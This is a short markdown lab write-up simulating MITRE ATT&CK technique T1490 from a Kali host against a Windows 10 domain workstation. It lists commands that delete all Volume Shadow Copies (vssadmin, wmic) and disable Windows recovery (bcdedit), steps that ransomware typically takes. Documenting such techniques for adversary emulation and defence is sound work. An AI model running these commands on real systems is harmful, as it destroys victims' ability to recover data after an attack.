# T1490 - Inhibit System Recovery

## Description
This technique involves deleting or disabling system recovery features such as Volume Shadow Copies and Windows Recovery options. 
The goal is to prevent the victim from easily restoring files or the system after an attack (commonly used in ransomware scenarios).


---

## Simulation Parameters

- **Attacker:** Kali Linux (192.168.10.250)
- **Target:** Windows 10 Workstation (192.168.10.9) - Domain: ADPRO
- **Access Level:** Administrator (via Impacket PsExec / WinRM)
- **Objective:** Disable system recovery capabilities

---

## Execution Steps

### 1. Delete Volume Shadow Copies

cmd
vssadmin delete shadows /all /quiet

## 2. Alternative Methodcmd

wmic shadowcopy delete

## 3. Disable Windows Recovery (Optional)cmd

bcdedit /set {default} recoveryenabled No

